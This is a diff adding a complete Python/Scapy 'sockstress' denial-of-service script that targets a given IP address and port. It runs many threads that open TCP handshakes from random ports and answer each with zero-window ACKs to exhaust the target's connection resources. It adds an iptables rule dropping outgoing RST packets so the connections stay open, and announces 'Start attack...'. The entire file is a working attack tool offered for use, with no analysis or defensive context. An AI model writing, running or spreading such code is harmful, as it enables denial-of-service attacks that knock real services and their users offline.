@@ -1,0 +1,53 @@
+from scapy.all import *
+from time import sleep
+import thread
+import signal
+import os
+import sys
+import random
+ 
+def sockstress(target, dstport):
+ 
+    while True:
+        try:
+            x = random.randint(0, 65535)
+            response =sr1(IP(dst=target)/TCP(dport=dstport, sport=x, flags='S'), timeout = 1, verbose = 0)
+            send(IP(dst=target)/TCP(dport=dstport, sport=x, flags='A', window=0, ack=(response[TCP].seq+1))/'\x00\x00', verbose = 0)
+        except:
+            pass
+ 
+def main():
+ 
+    if len(sys.argv) != 4:
+ 
+        print "Usage: python sockstress.py [target_ip] [target_port] [thread_num]" 
+        sys.exit(0)
+ 
+    target = str(sys.argv[1])
+    dstport = int(sys.argv[2])
+    thread_num = int(sys.argv[3])
+ 
+    def shutdown(signal, frame):
+ 
+        os.system('iptables -D OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
+        sys.exit(0)
+ 
+    def attack(target, dstport, thread_num):
+ 
+        os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
+        signal.signal(signal.SIGINT, shutdown)
+ 
+        print "Start attack..."
+ 
+        for x in range(thread_num):
+ 
+            thread.start_new_thread(sockstress, (target, dstport))
+ 
+        while  True:
+            sleep(1)
+ 
+    attack(target, dstport, thread_num)
+ 
+if __name__ == '__main__':
+ 
+    main()
